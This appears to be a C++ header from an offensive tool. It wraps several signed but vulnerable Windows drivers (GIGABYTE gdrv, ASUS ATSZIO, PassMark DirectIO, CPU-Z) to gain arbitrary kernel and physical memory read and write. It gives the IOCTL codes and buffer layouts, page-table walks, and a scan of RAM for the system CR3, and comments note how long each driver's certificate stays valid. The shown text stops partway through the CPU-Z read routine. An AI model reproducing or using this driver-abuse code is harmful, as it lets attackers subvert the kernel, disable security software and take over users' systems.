#pragma once
#include <Windows.h>
#include <cstdint>
#include <cstdio>
#include <string>

// ============================================================================
// Kernel R/W Abstraction — supports multiple vulnerable driver backends
// Backend 1: LnvMSRIO (LnvMSRIO.sys) — physical memory R/W via Lenovo MSR I/O
// Backend 2: ATSZIO (ATSZIO64.sys) — physical memory via ASUSTeK SATA I/O
// Backend 3: GIO (gdrv.sys) — virtual memory memcpy
// Backend 4: DirectIO (DirectIo64.sys) — physical memory via PassMark DirectIO
// Backend 5: CPUZ (cpuz.sys) — physical memory via CPUID CPU-Z
// ============================================================================

namespace KernelRW {

enum class Backend { NONE = 0, GIO, LNVMSRIO, ATSZIO, DIRECTIO, CPUZ };

// ── GIO (GIGABYTE gdrv.sys) definitions ─────────────────────────────────

#define GIO_DEVICE_STRING   "\\\\.\\GIO"
#define FILE_DEVICE_GIO     0xC350
#define IOCTL_GIO_MEMCPY    CTL_CODE(FILE_DEVICE_GIO, 0xA02, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct GIOMemcpyInput {
    ULONG64 Dst;
    ULONG64 Src;
    DWORD   Size;
};

// ── Unified context ─────────────────────────────────────────────────────

struct Context {
    Backend type = Backend::NONE;
    HANDLE  device = INVALID_HANDLE_VALUE;
    DWORD64 cr3 = 0;
    bool    la57 = false;
};

// ============================================================================
// Physical RAM range protection — shared across all backends
// Prevents MmMapIoSpace on non-RAM addresses (drivers don't null-check → BSOD)
// ============================================================================

struct PhysMemRange { DWORD64 start, end; };
static PhysMemRange g_physRam[128];
static int g_physRamCount = -1;

static DWORD64 g_maxPhysAddr = 0;
static void InitPhysRAMMap();
static bool PhysAddrInRAM(DWORD64 addr, DWORD size);
static bool PhysAddrBelowMax(DWORD64 addr, DWORD size);
static DWORD64 GetCR3ScanLimit();

static FILE* g_lnvLog = nullptr;
static void LNVMSRIO_Log(const char* fmt, ...) {
    if (!g_lnvLog) {
        char path[MAX_PATH];
        GetTempPathA(MAX_PATH, path);
        strcat_s(path, "takepeek_krw.log");
        fopen_s(&g_lnvLog, path, "w");
    }
    if (!g_lnvLog) return;
    va_list a; va_start(a, fmt);
    vfprintf(g_lnvLog, fmt, a);
    va_end(a);
    fflush(g_lnvLog);
}

// ============================================================================
// GIO backend
// ============================================================================

static HANDLE GIO_OpenDevice() {
    return CreateFileA(GIO_DEVICE_STRING, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, nullptr);
}

static bool GIO_Memcpy(HANDLE dev, ULONG64 dst, ULONG64 src, DWORD size) {
    GIOMemcpyInput input = { dst, src, size };
    DWORD returned = 0;
    return DeviceIoControl(dev, IOCTL_GIO_MEMCPY,
        &input, sizeof(input), nullptr, 0, &returned, nullptr) != FALSE;
}

static bool GIO_IsValidKernelAddr(ULONG64 addr) {
    if (addr < 0xFFFF800000000000ULL) return false;
    if (addr >= 0xFFFFFFFFFFFFF000ULL) return false;
    if (addr == 0) return false;
    return true;
}

static DWORD64 GIO_Read64(HANDLE dev, ULONG64 addr, bool* ok = nullptr) {
    if (!GIO_IsValidKernelAddr(addr)) {
        if (ok) *ok = false;
        return 0;
    }
    DWORD64 val = 0;
    bool success = GIO_Memcpy(dev, (ULONG64)&val, addr, 8);
    if (ok) *ok = success;
    return val;
}

static bool GIO_Write64(HANDLE dev, ULONG64 addr, DWORD64 val) {
    if (!GIO_IsValidKernelAddr(addr)) return false;
    return GIO_Memcpy(dev, addr, (ULONG64)&val, 8);
}

// ============================================================================
// ATSZIO backend — physical memory R/W via ASUSTeK SATA I/O (ATSZIO64.sys)
// Signed by ASUSTeK, cert valid Apr 2027, TS to 2034.
// Uses \Device\PhysicalMemory mapping; single-value IOCTLs map/read/unmap per call.
// ============================================================================

#define ATSZIO_DEVICE_STRING    "\\\\.\\ATSZIO"
#define IOCTL_ATSZIO_READ_PHYS  0x88070F7C
#define IOCTL_ATSZIO_WRITE_PHYS 0x88070F80

static HANDLE ATSZIO_OpenDevice() {
    return CreateFileA(ATSZIO_DEVICE_STRING, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, nullptr);
}

static DWORD ATSZIO_ReadPhys32(HANDLE dev, DWORD64 physAddr, bool forPT = false) {
    if (!PhysAddrInRAM(physAddr, 4))
        return 0;
    BYTE buf[0x1028] = {};
    buf[0x00] = 4; // access_size = DWORD
    *(DWORD*)(buf + 0x10) = 0x1000; // map_size = one page
    *(DWORD64*)(buf + 0x18) = physAddr;
    DWORD returned = 0;
    if (!DeviceIoControl(dev, IOCTL_ATSZIO_READ_PHYS,
        buf, sizeof(buf), buf, sizeof(buf), &returned, nullptr))
        return 0;
    return *(DWORD*)(buf + 0x04);
}

static DWORD64 ATSZIO_ReadPhys64(HANDLE dev, DWORD64 physAddr, bool forPT = false) {
    DWORD lo = ATSZIO_ReadPhys32(dev, physAddr, forPT);
    DWORD hi = ATSZIO_ReadPhys32(dev, physAddr + 4, forPT);
    return ((DWORD64)hi << 32) | lo;
}

static bool ATSZIO_WritePhys32(HANDLE dev, DWORD64 physAddr, DWORD value) {
    if (!PhysAddrInRAM(physAddr, 4))
        return false;
    BYTE buf[0x1028] = {};
    buf[0x00] = 4; // access_size = DWORD
    *(DWORD*)(buf + 0x04) = value;
    *(DWORD*)(buf + 0x10) = 0x1000; // map_size = one page
    *(DWORD64*)(buf + 0x18) = physAddr;
    DWORD returned = 0;
    return DeviceIoControl(dev, IOCTL_ATSZIO_WRITE_PHYS,
        buf, sizeof(buf), buf, sizeof(buf), &returned, nullptr) != FALSE;
}

static bool ATSZIO_WritePhys64(HANDLE dev, DWORD64 physAddr, DWORD64 value) {
    if (!ATSZIO_WritePhys32(dev, physAddr, (DWORD)(value & 0xFFFFFFFF)))
        return false;
    return ATSZIO_WritePhys32(dev, physAddr + 4, (DWORD)(value >> 32));
}

static DWORD64 ATSZIO_VirtToPhys4(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr) {
    DWORD64 pml4e = ATSZIO_ReadPhys64(dev, (cr3 & ~0xFFFULL) | (((virtAddr >> 39) & 0x1FF) * 8), true);
    if (!(pml4e & 1)) return 0;
    DWORD64 pdpte = ATSZIO_ReadPhys64(dev, (pml4e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 30) & 0x1FF) * 8), true);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) return (pdpte & 0x000FFFFFC0000000ULL) | (virtAddr & 0x3FFFFFFFULL);
    DWORD64 pde = ATSZIO_ReadPhys64(dev, (pdpte & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 21) & 0x1FF) * 8), true);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0x000FFFFFFFE00000ULL) | (virtAddr & 0x1FFFFFULL);
    DWORD64 pte = ATSZIO_ReadPhys64(dev, (pde & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 12) & 0x1FF) * 8), true);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (virtAddr & 0xFFFULL);
}

static DWORD64 ATSZIO_VirtToPhys5(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr) {
    DWORD64 pml5e = ATSZIO_ReadPhys64(dev, (cr3 & ~0xFFFULL) | (((virtAddr >> 48) & 0x1FF) * 8), true);
    if (!(pml5e & 1)) return 0;
    DWORD64 pml4e = ATSZIO_ReadPhys64(dev, (pml5e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 39) & 0x1FF) * 8), true);
    if (!(pml4e & 1)) return 0;
    DWORD64 pdpte = ATSZIO_ReadPhys64(dev, (pml4e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 30) & 0x1FF) * 8), true);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) return (pdpte & 0x000FFFFFC0000000ULL) | (virtAddr & 0x3FFFFFFFULL);
    DWORD64 pde = ATSZIO_ReadPhys64(dev, (pdpte & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 21) & 0x1FF) * 8), true);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0x000FFFFFFFE00000ULL) | (virtAddr & 0x1FFFFFULL);
    DWORD64 pte = ATSZIO_ReadPhys64(dev, (pde & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 12) & 0x1FF) * 8), true);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (virtAddr & 0xFFFULL);
}

static DWORD64 ATSZIO_VirtToPhys(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr, bool la57) {
    if (la57)
        return ATSZIO_VirtToPhys5(dev, cr3, virtAddr);
    return ATSZIO_VirtToPhys4(dev, cr3, virtAddr);
}

static DWORD64 ATSZIO_FindSystemCR3(HANDLE dev, DWORD64 knownKernelBase, bool& outLa57) {
    InitPhysRAMMap();
    LNVMSRIO_Log("[ATSZIO] CR3 scan: kBase=0x%llX ramRanges=%d scanLimit=0x%llX\n",
        (unsigned long long)knownKernelBase, g_physRamCount, (unsigned long long)GetCR3ScanLimit());
    if (g_physRamCount <= 0) { outLa57 = false; return 0; }

    DWORD64 sanityAddr = (g_physRamCount > 0) ? g_physRam[0].start : 0x1000;
    DWORD sanity = ATSZIO_ReadPhys32(dev, sanityAddr);
    LNVMSRIO_Log("[ATSZIO] Sanity read phys 0x%llX = 0x%08X\n",
        (unsigned long long)sanityAddr, sanity);
    if (sanity == 0) {
        LNVMSRIO_Log("[ATSZIO] Physical read returns 0 — IOCTL may be broken\n");
    }

    DWORD64 kPml4Idx = (knownKernelBase >> 39) & 0x1FFULL;
    DWORD64 kPdptIdx = (knownKernelBase >> 30) & 0x1FFULL;
    LNVMSRIO_Log("[ATSZIO] Using PML4 index 0x%llX (not hardcoded 256)\n",
        (unsigned long long)kPml4Idx);

    int pml4Hits = 0, pdptHits = 0, vtpHits = 0;
    for (int ri = 0; ri < g_physRamCount; ri++) {
        DWORD64 rangeStart = (g_physRam[ri].start + 0xFFF) & ~0xFFFULL;
        if (rangeStart < 0x1000) rangeStart = 0x1000;
        LNVMSRIO_Log("[ATSZIO] Scanning range[%d] 0x%llX-0x%llX\n",
            ri, (unsigned long long)rangeStart, (unsigned long long)g_physRam[ri].end);
        for (DWORD64 candidate = rangeStart; candidate < g_physRam[ri].end; candidate += 0x1000) {
            DWORD64 kEntry = ATSZIO_ReadPhys64(dev, candidate + kPml4Idx * 8);
            if (!(kEntry & 1)) continue;
            DWORD64 kFrame = kEntry & 0x000FFFFFFFFFF000ULL;
            if (!kFrame || !PhysAddrInRAM(kFrame, 0x1000)) continue;
            pml4Hits++;
            DWORD64 pdptEntry = ATSZIO_ReadPhys64(dev, kFrame + kPdptIdx * 8);
            if (!(pdptEntry & 1)) continue;
            DWORD64 pdptFrame = pdptEntry & 0x000FFFFFFFFFF000ULL;
            if (!(pdptEntry & 0x80) && (!pdptFrame || !PhysAddrInRAM(pdptFrame, 0x1000))) continue;
            pdptHits++;
            DWORD64 phys = ATSZIO_VirtToPhys4(dev, candidate, knownKernelBase);
            if (!phys)
                phys = ATSZIO_VirtToPhys5(dev, candidate, knownKernelBase);
            if (!phys) continue;
            vtpHits++;
            if (!PhysAddrInRAM(phys, 4)) continue;
            DWORD mz = ATSZIO_ReadPhys32(dev, phys);
            LNVMSRIO_Log("[ATSZIO] candidate=0x%llX phys=0x%llX mz=0x%04X\n",
                (unsigned long long)candidate, (unsigned long long)phys, mz & 0xFFFF);
            if ((mz & 0xFFFF) == 0x5A4D) {
                DWORD64 phys4 = ATSZIO_VirtToPhys4(dev, candidate, knownKernelBase);
                if (phys4) {
                    outLa57 = false;
                    LNVMSRIO_Log("[ATSZIO] CR3 FOUND: 0x%llX la57=0 (VTP4 works)\n",
                        (unsigned long long)candidate);
                    return candidate;
                }
                DWORD64 vtp5Idx = (knownKernelBase >> 48) & 0x1FFULL;
                DWORD64 pml5eVal = ATSZIO_ReadPhys64(dev, (candidate & ~0xFFFULL) | (vtp5Idx * 8));
                DWORD64 extractedPml4 = pml5eVal & 0x000FFFFFFFFFF000ULL;
                LNVMSRIO_Log("[ATSZIO] VTP4 failed, extracting VTP5 PML4: candidate[%llu]=0x%llX frame=0x%llX\n",
                    (unsigned long long)vtp5Idx, (unsigned long long)pml5eVal, (unsigned long long)extractedPml4);
                if (extractedPml4 && extractedPml4 != (candidate & ~0xFFFULL)) {
                    DWORD64 extPhys = ATSZIO_VirtToPhys4(dev, extractedPml4, knownKernelBase);
                    if (extPhys) {
                        DWORD extMz = ATSZIO_ReadPhys32(dev, extPhys);
                        LNVMSRIO_Log("[ATSZIO]   VTP4(extracted)=0x%llX mz=0x%04X\n",
                            (unsigned long long)extPhys, extMz & 0xFFFF);
                        if ((extMz & 0xFFFF) == 0x5A4D) {
                            outLa57 = false;
                            LNVMSRIO_Log("[ATSZIO] CR3 FOUND (extracted kernel PML4): 0x%llX la57=0\n",
                                (unsigned long long)extractedPml4);
                            return extractedPml4;
                        }
                    }
                }
                outLa57 = true;
                LNVMSRIO_Log("[ATSZIO] CR3 FOUND (fallback): 0x%llX la57=1\n",
                    (unsigned long long)candidate);
                return candidate;
            }
        }
    }
    LNVMSRIO_Log("[ATSZIO] CR3 FAILED: pml4Hits=%d pdptHits=%d vtpHits=%d\n", pml4Hits, pdptHits, vtpHits);

    // Diagnostic second pass: verbose walk for candidates with PML4[kBaseIdx] present
    DWORD64 kPdIdx   = (knownKernelBase >> 21) & 0x1FFULL;
    DWORD64 kPtIdx   = (knownKernelBase >> 12) & 0x1FFULL;
    LNVMSRIO_Log("[ATSZIO] DIAG: walk indices PML4[0x%llX] PDPT[0x%llX] PD[0x%llX] PT[0x%llX]\n",
        (unsigned long long)kPml4Idx, (unsigned long long)kPdptIdx,
        (unsigned long long)kPdIdx, (unsigned long long)kPtIdx);

    // Sanity: test reads from each RAM range
    for (int ri = 0; ri < g_physRamCount; ri++) {
        DWORD64 testAddr = g_physRam[ri].start;
        DWORD testVal = ATSZIO_ReadPhys32(dev, testAddr);
        LNVMSRIO_Log("[ATSZIO] DIAG: range[%d] read 0x%llX = 0x%08X\n",
            ri, (unsigned long long)testAddr, testVal);
    }

    int diagCount = 0;
    for (int dri = 0; dri < g_physRamCount && diagCount < 15; dri++) {
        DWORD64 dStart = (g_physRam[dri].start + 0xFFF) & ~0xFFFULL;
        if (dStart < 0x1000) dStart = 0x1000;
    for (DWORD64 candidate = dStart; candidate < g_physRam[dri].end && diagCount < 15; candidate += 0x1000) {
        DWORD64 kEntry = ATSZIO_ReadPhys64(dev, candidate + kPml4Idx * 8);
        if (!(kEntry & 1)) continue;
        DWORD64 kPfn = kEntry & 0x000FFFFFFFFFF000ULL;
        if (!kPfn || !PhysAddrInRAM(kPfn, 0x1000)) continue;

        diagCount++;
        bool kPfnOk = true;

        DWORD64 pdpte = 0;
        DWORD64 pdptPfn = 0;
        bool pdptOk = false;
        if (kPfnOk) {
            pdpte = ATSZIO_ReadPhys64(dev, kPfn + kPdptIdx * 8);
            pdptPfn = pdpte & 0x000FFFFFFFFFF000ULL;
            pdptOk = pdptPfn ? PhysAddrInRAM(pdptPfn, 0x1000) : false;
        }

        DWORD64 pde = 0;
        DWORD64 pdPfn = 0;
        bool pdOk = false;
        if ((pdpte & 1) && !(pdpte & 0x80) && pdptOk) {
            pde = ATSZIO_ReadPhys64(dev, pdptPfn + kPdIdx * 8);
            pdPfn = pde & 0x000FFFFFFFFFF000ULL;
            pdOk = pdPfn ? PhysAddrInRAM(pdPfn, 0x1000) : false;
        }

        DWORD64 pte = 0;
        DWORD64 finalPhys = 0;
        if (pdpte & 0x80) {
            finalPhys = (pdpte & 0x000FFFFFC0000000ULL) | (knownKernelBase & 0x3FFFFFFFULL);
        } else if (pde & 0x80) {
            finalPhys = (pde & 0x000FFFFFFFE00000ULL) | (knownKernelBase & 0x1FFFFFULL);
        } else if ((pde & 1) && pdOk) {
            pte = ATSZIO_ReadPhys64(dev, pdPfn + kPtIdx * 8);
            if (pte & 1)
                finalPhys = (pte & 0x000FFFFFFFFFF000ULL) | (knownKernelBase & 0xFFFULL);
        }

        DWORD mzVal = 0;
        bool mzReadable = false;
        if (finalPhys && PhysAddrInRAM(finalPhys, 4)) {
            mzVal = ATSZIO_ReadPhys32(dev, finalPhys);
            mzReadable = true;
        }

        LNVMSRIO_Log("[ATSZIO] DIAG cand=0x%llX:\n"
            "  PML4[0x%llX]=0x%llX pfn=0x%llX inRam=%d\n"
            "  PDPT[0x%llX]=0x%llX pfn=0x%llX inRam=%d large=%d\n"
            "  PD  [0x%llX]=0x%llX pfn=0x%llX inRam=%d large=%d\n"
            "  PT  [0x%llX]=0x%llX\n"
            "  final=0x%llX readable=%d mz=0x%04X\n",
            (unsigned long long)candidate,
            (unsigned long long)kPml4Idx, (unsigned long long)kEntry, (unsigned long long)kPfn, kPfnOk,
            (unsigned long long)kPdptIdx, (unsigned long long)pdpte, (unsigned long long)pdptPfn, pdptOk, (int)((pdpte >> 7) & 1),
            (unsigned long long)kPdIdx, (unsigned long long)pde, (unsigned long long)pdPfn, pdOk, (int)((pde >> 7) & 1),
            (unsigned long long)kPtIdx, (unsigned long long)pte,
            (unsigned long long)finalPhys, mzReadable, mzVal & 0xFFFF);
    }
    }
    LNVMSRIO_Log("[ATSZIO] DIAG: %d candidates had PML4[0x%llX] present\n", diagCount, (unsigned long long)kPml4Idx);

    outLa57 = false;
    return 0;
}

// ============================================================================
// DirectIO backend — physical memory via PassMark DirectIO (DirectIo64.sys)
// Cert valid Jan 2027, TS to 2036. Maps physical pages to usermode VA.
// Read mode: ZwMapViewOfSection (read-only). Write mode needs vendor check or fallback.
// ============================================================================

#define DIRECTIO_DEVICE_STRING       "\\\\.\\DirectIo64"
#define IOCTL_DIRECTIO_MAP_PHYS      0x8011E044
#define IOCTL_DIRECTIO_UNMAP_PHYS    0x8011E048

static HANDLE DIRECTIO_OpenDevice() {
    return CreateFileA(DIRECTIO_DEVICE_STRING, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, nullptr);
}

static DWORD DIRECTIO_ReadPhys32(HANDLE dev, DWORD64 physAddr, bool forPT = false) {
    if (!PhysAddrInRAM(physAddr, 4))
        return 0;
    BYTE buf[0x3D] = {};
    *(DWORD*)(buf + 0x18)   = 0x1000;
    *(DWORD64*)(buf + 0x1C) = physAddr & ~0xFFFULL;
    DWORD returned = 0;
    if (!DeviceIoControl(dev, IOCTL_DIRECTIO_MAP_PHYS,
        buf, sizeof(buf), buf, sizeof(buf), &returned, nullptr))
        return 0;
    DWORD64 userVA = *(DWORD64*)(buf + 0x24);
    if (!userVA) {
        DeviceIoControl(dev, IOCTL_DIRECTIO_UNMAP_PHYS, buf, sizeof(buf), nullptr, 0, &returned, nullptr);
        return 0;
    }
    DWORD val = 0;
    __try { val = *(volatile DWORD*)((BYTE*)(ULONG_PTR)userVA + (physAddr & 0xFFF)); }
    __except(EXCEPTION_EXECUTE_HANDLER) { val = 0; }
    DeviceIoControl(dev, IOCTL_DIRECTIO_UNMAP_PHYS, buf, sizeof(buf), nullptr, 0, &returned, nullptr);
    return val;
}

static DWORD64 DIRECTIO_ReadPhys64(HANDLE dev, DWORD64 physAddr, bool forPT = false) {
    DWORD lo = DIRECTIO_ReadPhys32(dev, physAddr, forPT);
    DWORD hi = DIRECTIO_ReadPhys32(dev, physAddr + 4, forPT);
    return ((DWORD64)hi << 32) | lo;
}

static bool DIRECTIO_WritePhys32(HANDLE dev, DWORD64 physAddr, DWORD value) {
    if (!PhysAddrInRAM(physAddr, 4))
        return false;
    BYTE buf[0x3D] = {};
    *(DWORD*)(buf + 0x18)   = 0x1000;
    *(DWORD64*)(buf + 0x1C) = physAddr & ~0xFFFULL;
    buf[0x2C] = 1; // write mode
    DWORD returned = 0;
    if (!DeviceIoControl(dev, IOCTL_DIRECTIO_MAP_PHYS,
        buf, sizeof(buf), buf, sizeof(buf), &returned, nullptr))
        return false;
    DWORD64 userVA = *(DWORD64*)(buf + 0x24);
    if (!userVA) {
        DeviceIoControl(dev, IOCTL_DIRECTIO_UNMAP_PHYS, buf, sizeof(buf), nullptr, 0, &returned, nullptr);
        return false;
    }
    bool ok = true;
    __try { *(volatile DWORD*)((BYTE*)(ULONG_PTR)userVA + (physAddr & 0xFFF)) = value; }
    __except(EXCEPTION_EXECUTE_HANDLER) { ok = false; }
    DeviceIoControl(dev, IOCTL_DIRECTIO_UNMAP_PHYS, buf, sizeof(buf), nullptr, 0, &returned, nullptr);
    return ok;
}

static bool DIRECTIO_WritePhys64(HANDLE dev, DWORD64 physAddr, DWORD64 value) {
    if (!DIRECTIO_WritePhys32(dev, physAddr, (DWORD)(value & 0xFFFFFFFF)))
        return false;
    return DIRECTIO_WritePhys32(dev, physAddr + 4, (DWORD)(value >> 32));
}

static DWORD64 DIRECTIO_VirtToPhys4(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr) {
    DWORD64 pml4e = DIRECTIO_ReadPhys64(dev, (cr3 & ~0xFFFULL) | (((virtAddr >> 39) & 0x1FF) * 8), true);
    if (!(pml4e & 1)) return 0;
    DWORD64 pdpte = DIRECTIO_ReadPhys64(dev, (pml4e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 30) & 0x1FF) * 8), true);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) return (pdpte & 0x000FFFFFC0000000ULL) | (virtAddr & 0x3FFFFFFFULL);
    DWORD64 pde = DIRECTIO_ReadPhys64(dev, (pdpte & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 21) & 0x1FF) * 8), true);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0x000FFFFFFFE00000ULL) | (virtAddr & 0x1FFFFFULL);
    DWORD64 pte = DIRECTIO_ReadPhys64(dev, (pde & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 12) & 0x1FF) * 8), true);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (virtAddr & 0xFFFULL);
}

static DWORD64 DIRECTIO_VirtToPhys5(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr) {
    DWORD64 pml5e = DIRECTIO_ReadPhys64(dev, (cr3 & ~0xFFFULL) | (((virtAddr >> 48) & 0x1FF) * 8), true);
    if (!(pml5e & 1)) return 0;
    DWORD64 pml4e = DIRECTIO_ReadPhys64(dev, (pml5e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 39) & 0x1FF) * 8), true);
    if (!(pml4e & 1)) return 0;
    DWORD64 pdpte = DIRECTIO_ReadPhys64(dev, (pml4e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 30) & 0x1FF) * 8), true);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) return (pdpte & 0x000FFFFFC0000000ULL) | (virtAddr & 0x3FFFFFFFULL);
    DWORD64 pde = DIRECTIO_ReadPhys64(dev, (pdpte & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 21) & 0x1FF) * 8), true);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0x000FFFFFFFE00000ULL) | (virtAddr & 0x1FFFFFULL);
    DWORD64 pte = DIRECTIO_ReadPhys64(dev, (pde & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 12) & 0x1FF) * 8), true);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (virtAddr & 0xFFFULL);
}

static DWORD64 DIRECTIO_VirtToPhys(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr, bool la57) {
    if (la57)
        return DIRECTIO_VirtToPhys5(dev, cr3, virtAddr);
    return DIRECTIO_VirtToPhys4(dev, cr3, virtAddr);
}

static DWORD64 DIRECTIO_FindSystemCR3(HANDLE dev, DWORD64 knownKernelBase, bool& outLa57) {
    InitPhysRAMMap();
    LNVMSRIO_Log("[DIRECTIO] CR3 scan: kBase=0x%llX ramRanges=%d scanLimit=0x%llX\n",
        (unsigned long long)knownKernelBase, g_physRamCount, (unsigned long long)GetCR3ScanLimit());
    if (g_physRamCount <= 0) { outLa57 = false; return 0; }

    DWORD64 sanityAddr = (g_physRamCount > 0) ? g_physRam[0].start : 0x1000;
    DWORD sanity = DIRECTIO_ReadPhys32(dev, sanityAddr);
    LNVMSRIO_Log("[DIRECTIO] Sanity read phys 0x%llX = 0x%08X\n",
        (unsigned long long)sanityAddr, sanity);

    DWORD64 kPml4Idx = (knownKernelBase >> 39) & 0x1FFULL;
    DWORD64 kPdptIdx = (knownKernelBase >> 30) & 0x1FFULL;
    LNVMSRIO_Log("[DIRECTIO] Using PML4 index 0x%llX\n", (unsigned long long)kPml4Idx);

    int pml4Hits = 0, pdptHits = 0, vtpHits = 0;
    for (int ri = 0; ri < g_physRamCount; ri++) {
        DWORD64 rangeStart = (g_physRam[ri].start + 0xFFF) & ~0xFFFULL;
        if (rangeStart < 0x1000) rangeStart = 0x1000;
        LNVMSRIO_Log("[DIRECTIO] Scanning range[%d] 0x%llX-0x%llX\n",
            ri, (unsigned long long)rangeStart, (unsigned long long)g_physRam[ri].end);
        for (DWORD64 candidate = rangeStart; candidate < g_physRam[ri].end; candidate += 0x1000) {
            DWORD64 kEntry = DIRECTIO_ReadPhys64(dev, candidate + kPml4Idx * 8);
            if (!(kEntry & 1)) continue;
            DWORD64 kFrame = kEntry & 0x000FFFFFFFFFF000ULL;
            if (!kFrame || !PhysAddrInRAM(kFrame, 0x1000)) continue;
            pml4Hits++;
            DWORD64 pdptEntry = DIRECTIO_ReadPhys64(dev, kFrame + kPdptIdx * 8);
            if (!(pdptEntry & 1)) continue;
            DWORD64 pdptFrame = pdptEntry & 0x000FFFFFFFFFF000ULL;
            if (!(pdptEntry & 0x80) && (!pdptFrame || !PhysAddrInRAM(pdptFrame, 0x1000))) continue;
            pdptHits++;
            DWORD64 phys = DIRECTIO_VirtToPhys4(dev, candidate, knownKernelBase);
            if (!phys)
                phys = DIRECTIO_VirtToPhys5(dev, candidate, knownKernelBase);
            if (!phys) continue;
            vtpHits++;
            if (!PhysAddrInRAM(phys, 4)) continue;
            DWORD mz = DIRECTIO_ReadPhys32(dev, phys);
            LNVMSRIO_Log("[DIRECTIO] candidate=0x%llX phys=0x%llX mz=0x%04X\n",
                (unsigned long long)candidate, (unsigned long long)phys, mz & 0xFFFF);
            if ((mz & 0xFFFF) == 0x5A4D) {
                if (DIRECTIO_VirtToPhys4(dev, candidate, knownKernelBase) != 0) {
                    outLa57 = false;
                    LNVMSRIO_Log("[DIRECTIO] CR3 FOUND: 0x%llX la57=0\n", (unsigned long long)candidate);
                    return candidate;
                }
                DWORD64 vtp5Idx = (knownKernelBase >> 48) & 0x1FFULL;
                DWORD64 pml5eVal = DIRECTIO_ReadPhys64(dev, (candidate & ~0xFFFULL) | (vtp5Idx * 8));
                DWORD64 extractedPml4 = pml5eVal & 0x000FFFFFFFFFF000ULL;
                LNVMSRIO_Log("[DIRECTIO] VTP4 failed, extracting VTP5 PML4: frame=0x%llX\n",
                    (unsigned long long)extractedPml4);
                if (extractedPml4 && extractedPml4 != (candidate & ~0xFFFULL)) {
                    DWORD64 extPhys = DIRECTIO_VirtToPhys4(dev, extractedPml4, knownKernelBase);
                    if (extPhys) {
                        DWORD extMz = DIRECTIO_ReadPhys32(dev, extPhys);
                        if ((extMz & 0xFFFF) == 0x5A4D) {
                            outLa57 = false;
                            LNVMSRIO_Log("[DIRECTIO] CR3 FOUND (extracted kernel PML4): 0x%llX la57=0\n",
                                (unsigned long long)extractedPml4);
                            return extractedPml4;
                        }
                    }
                }
                outLa57 = true;
                LNVMSRIO_Log("[DIRECTIO] CR3 FOUND (fallback): 0x%llX la57=1\n", (unsigned long long)candidate);
                return candidate;
            }
        }
    }
    LNVMSRIO_Log("[DIRECTIO] CR3 FAILED: pml4Hits=%d pdptHits=%d vtpHits=%d\n", pml4Hits, pdptHits, vtpHits);
    outLa57 = false;
    return 0;
}

// ============================================================================
// CPUZ backend — physical memory via CPUID CPU-Z (cpuz149.sys)
// Cert TS to 2028. Read via MmMapIoSpace to user VA, write via validated DWORD.
// Write limited to 32-bit physical addresses (< 4GB). Read supports full 64-bit.
// ============================================================================

#define CPUZ_DEVICE_STRING     "\\\\.\\CPUZ149"
#define IOCTL_CPUZ_READ_PHYS   0x9C402540
#define IOCTL_CPUZ_WRITE_PHYS  0x9C40270C

static HANDLE CPUZ_OpenDevice() {
    return CreateFileA(CPUZ_DEVICE_STRING, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, nullptr);
}

#pragma pack(push, 1)
struct CPUZReadInput {
    DWORD  phys_addr_high;
    DWORD  phys_addr_low;
    DWORD  read_size;
    DWORD  dest_va_high;
    DWORD  dest_va_low;
};
struct CPUZWriteInput {
    DWORD  phys_addr;
    DWORD  check_value;
    DWORD  write_value;
};
#pragma pack(pop)

static bool CPUZ_ReadPhysBuf(HANDLE dev, DWORD64 physAddr, void* dest, DWORD size) {
    CPUZReadInput input = {};
    input.phys_addr_high = (DWORD)(physAddr >> 32);
    input.phys_addr_low  = (DWORD)(physAddr & 0xFFFFFFFF);
    input.read_size      = size;
    input.dest_va_high   = (DWORD)((DWORD64)(ULONG_PTR)dest >> 32);
    input.dest_va_low    = (DWORD)((DWORD64)(ULONG_PTR)dest & 0xFFFFFFFF);
    BYTE out[8] = {};
    DWORD returned = 0;
